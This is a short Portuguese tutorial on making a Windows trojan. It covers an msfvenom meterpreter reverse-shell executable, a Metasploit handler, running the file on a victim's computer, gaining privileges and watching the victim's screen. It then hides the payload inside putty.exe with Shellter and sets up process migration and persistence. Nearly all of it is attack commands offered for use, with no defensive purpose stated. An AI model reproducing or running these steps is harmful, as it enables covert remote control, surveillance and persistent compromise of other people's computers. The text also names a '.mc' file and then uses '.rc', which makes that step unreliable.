![CAVALO DE TROIA](https://www.holygamerz.com/images/posts/e6141a8fecd52c3d6062cfd84c6759ac-0.jpg)
## Criação do TROJAN com EXE

Criar o executável com MSFVENOM
~~~~
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.2.4 lport=4444 -e x86/shikata_ga_nai -f exe -o trojan
~~~~

Abrindo metasploit para esperar a conexão.
~~~~
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.0.2.4
exploit -j
~~~~~

Executar o TROJAN no computador da vítima.

Tentar ganhar direito elevados com:
~~~~~
getprivs
~~~~~

No meterpreter executar o comando abaixo para verificar a tela em tempo real da vítima:
~~~~~
screenshare
~~~~~

--------

## Camuflando o TROJAN

Fazer o download do putty.exe.

Instalar o shellter.
~~~~~
apt install shellter
~~~~~

Instalar o wine32.
~~~~~
apt install wine32
~~~~~
Abrir o shellter e passar o caminho do putty. Em seguida selecionar o meterpreter > reverse_tcp.

--------
## Como passar para outro processo após a invasão para evitar a perda de conexão com o cavalo de Tróia
* Criar um arquivo .mc
* Editar o arquivo inserindo: run post/windows/manage/migrate
* Entrar no multi handler > payload windows/meterpreter/reverse_tcp > show advanced
* set AutoRunScript ARQUIVO.rc

--------
## Como assegurar conexão com o sistema mesmo esse sendo desligado através de uma técnica chamada persistência
No meterpreter 
~~~~~
meterprete> run persistence -h
meterprete> run persistence -U -i 5 -p 4443 -r IP_DO_KALI
~~~~~
Trocar a porta do multi/handler para 4443 e esperar as conexões.
